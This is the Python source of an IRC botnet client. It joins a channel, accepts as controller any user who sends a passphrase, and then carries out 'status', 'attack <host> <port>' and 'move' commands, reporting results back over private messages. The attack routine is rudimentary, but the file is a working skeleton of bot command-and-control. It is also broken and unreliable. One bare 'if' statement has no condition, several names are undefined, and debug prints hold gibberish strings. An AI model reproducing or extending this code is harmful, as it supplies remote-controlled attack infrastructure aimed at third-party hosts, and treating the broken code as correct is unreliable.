import time
import socket 
import sys 
import threading
import random 
import traceback

class Bot:
    
    def setup(self, host, port, channel, phrase):
        self.HOST = host
        self.PORT = int(port)
        self.CHANNEL = channel
        self.PHRASE = phrase
        self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # BOT INFO
        self.botNick = "HELLO PAUL WASSUP " + str(random.randrange(10000))
        self.liveConnection = False # Flag to see if controller connection to IRC Server is active
        self.command = None
        self.attackCount = 0
        self.failCount = 1

        # BOT INFO - This is from controller
        self.botList = []
        self.botsSuccessful = []
        self.botsFailed = []
        self.botsMoved = []
        self.botsDisconnected = []
        self.acceptedCons = []

        try:
            self.IRCSOCKET.connect((self.HOST, self.PORT))
        except Exception as e:
            sys.stderr.write("Error: " + str(e))
            sys.exit(0)

        
    # Used for initial connection or connecting to a new channel
    def IRCconnect(self, chan):
        self.sendData("NICK {}\n" .format(self.botNick))
        self.sendData("USER bot * * :{}\n" .format(self.botNick))
        self.sendData("JOIN #{}\n" .format(chan))
        resp = self.getData()
        print(resp)
        return "433" in resp

    # PingPong protocol
    def pong(self):
        pass

    # Get response from Controller  
    def getData(self):
        return self.IRCSOCKET.recv(2048).decode().strip('\n\r')

    # Message Encoder
    def sendData(self, msg):
        self.IRCSOCKET.send(msg.encode())

    # Send to Controller 
    # Receiver should be CONBOT
    def privateMsg(self, receiver, msg):
        self.sendData("PRIVMSG {} :{}\n" .format(receiver, msg))

    # Send to Channel
    # Receiver should be CHANNEL
    def sendMsg(self, receiver, msg):
        self.sendData("PRIVMSG {} :{}\n" .format(receiver, msg))
    
    # Msg parser 
    def parseMsg(self, msg):
        prefix = ''
        trailing = []        
        if not msg:
            raise IRCBadMessage("Empty line.")
        if msg[0] == ':':            
            prefix, msg = msg[1:].split(' ', 1)
        if msg.find(' :') != -1:
            msg, trailing = msg.split(' :', 1)
            args = msg.split()
            args.append(trailing)
        else:
            args = msg.split()
        command = args.pop(0)
        return prefix, command, args

    # Gets response 
    def handleResponse(self, prefix, message):
        if message == self.PHRASE:
            self.acceptedCons.append(prefix)
        if prefix in self.acceptedCons:
            print("from " + prefix + " to do " + message)
            if message == "status":
                print("sending back status")
                self.privateMsg(prefix, "!STATUS! " + self.botNick)
            elif message.startswith("attack"):
                if len(message.split()) == 3:
                    hostTarget = message.split()[1]
                    portTarget = message.split()[2]
                    self.botAttack(hostTarget, portTarget)
                else:
                    print("Incorrect usage of command: attack <host-name> <port>")
            elif message.startswith("move"):
                if len(message.split()) == 4:
                    newHost = message.split()[1]
                    newPort = message.split()[2]
                    newChannel = message.split()[3]
                    self.botMove(newHost, newPort, newChannel)
                else:
                    print("Incorrect usage of command: move <host-name> <port> <channel>")
            

    # BOT COMMAND FUNCTIONS HERE ---------------------------------------------------------------------------------------------

    # Send Stats (Just the name of bot)
    def botStatus(self):
        global botNick
        sendPrivate("My name is: " + str(botNick))

    # Attack Server
    def botAttack(self, host, port):
        global conNick, botNick, attackCount 
        try:
            targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port = int(port)
            targetSocket.connect((host, port))
            print(self.botNick)
            self.attackCount = self.attackCount + 1 
            msg = str(self.botNick) + " " + str(self.attackCount) + "\n"
            targetSocket.send(msg.encode())
            # Send private message that attack was successful
            msg = ("Attack successful - " + self.botNick + " - " + "Success: " + str(self.attackCount) + " Failed: " + str(self.failCount))
            for x in self.acceptedCons:
                self.privateMsg(x, msg)
        except:
            # Send private message that attack failed 

            # Do tests to see what caused failure 
            try:
                targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                targetSocket.connect((host, port))
            except socket.error as e:
                if 


            msg = ("Attack failed - " + self.botNick + " - " + str(reason))
            self.failCount = self.failCount + 1
            for x in self.acceptedCons:
                self.privateMsg(x, msg)
            tb = traceback.format_exc()
            print(tb)
            pass 
            
    
    # Move Server
    def botMove(self, newHost, newPort, newChannel):
        #global HOST, PORT, CHANNEL, botNick 
        # First attempt to connect to new server 
        try:
            newSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            newPort = int(newPort)

            # Have this here bc had issues trying to connect to same server
            try:
                newSocket.connect((newHost, newPort))
            except:
                newSocket = self.IRCSOCKET

            # At this point, if it doesn't throw an exception, it should be good 
            # Now connect bot to channel
            self.IRCconnect(newChannel)
            resp = self.getData()
            print(resp)

            # If it reaches this point, connection is successful. Change globals
            print("I atleast reached here")
            self.HOST = newHost 
            self.PORT = newPort 
            self.CHANNEL = newChannel 
            # Disconnect from old Channel
            print("zzzzzzzzzzzzzasdfasdfdsasfdbdsv")
            try:
                self.IRCSOCKET.close()
                self.IRCSOCKET = newSocket 
            except:
                pass
            print("asdfadfadsfa")
            for x in self.acceptedCons:
                self.privateMsg(x, self.botNick + " has moved to " + str(self.HOST) + " " + str(self.PORT) + " " + str(self.CHANNEL))
            return True 
        except:
            print("ERROR: Unable to move to new channel\nBot still in old channel")
            tb = traceback.format_exc()
            print(tb)
            for x in self.acceptedCons:
                self.privateMsg(x, "Unable to move to new server. Bot still in old channel")
            return False 
        
    # Read
    def reader(self):
        try:
            while True:
                response = self.getData()
                #print(response)   
                if(response != ""):                                         
                        if response.find("PRIVMSG") != -1:                           
                            name = response.split('!',1)[0][1:]
                            message = response.split('PRIVMSG',1)[1].split(':',1)[1]
                            print("message from " + name + ": " + message)   
                            self.handleResponse(name, message)                               
                        elif response.find("PING") != -1:
                            self.sendData("PONG {}: :\r\n".format(self.HOST).encode("utf-8"))                                                                          
                        elif response.find('433') != -1:
                            #self.createNick(self.NICK)
                            #self.connectIRC(self.s,self.NICK, self.chan)  
                            # Use this to make new nickname if needed
                            oldName = self.botNick 
                            self.botNick = "SLAVE" + str(random.randrange(10000))
                            self.IRCconnect(self.CHANNEL)
                            for x in self.acceptedCons:
                                self.privateMsg(x, oldName + " has been renamed to " + self.botNick + " due to existing name in channel. Attempting to reconnect")
                            pass
        except Exception as e:
            print("Exception: ")
            print(e)
            print("Reconnecting in 5 seconds ...")
            time.sleep(5)
            self.reader()
            
def main():
    
    invalidNick = True
    noConnection = True
        # Get sys.argv
    if len(sys.argv) != 5:
        print("Wrong number of arguments")
        sys.exit() 
    
    HOST = sys.argv[1]
    PORT = sys.argv[2]
    CHANNEL = sys.argv[3]
    PHRASE = sys.argv[4]

    # Check if port is in valid range 
    if not PORT.isdigit():
        print("Invalid port.")
        sys.exit() 
    
    bot = Bot()

    # Keep connection to IRC server 
    while True:
        
        # set up controller bot and try to connect to the IRC
        try:
            print("setting up bot")
            bot.setup(HOST, PORT, CHANNEL, PHRASE)
        except Exception as e:
            print("{} Trying to reconnect..." .format(e))
            continue

        print("bot set up")
        print("connecting")
        while noConnection:
            noConnection = bot.IRCconnect(CHANNEL)
        
        print("Controller is running. Connected with nick: " + bot.botNick)

        bot.reader()



if __name__ == "__main__":
    main()


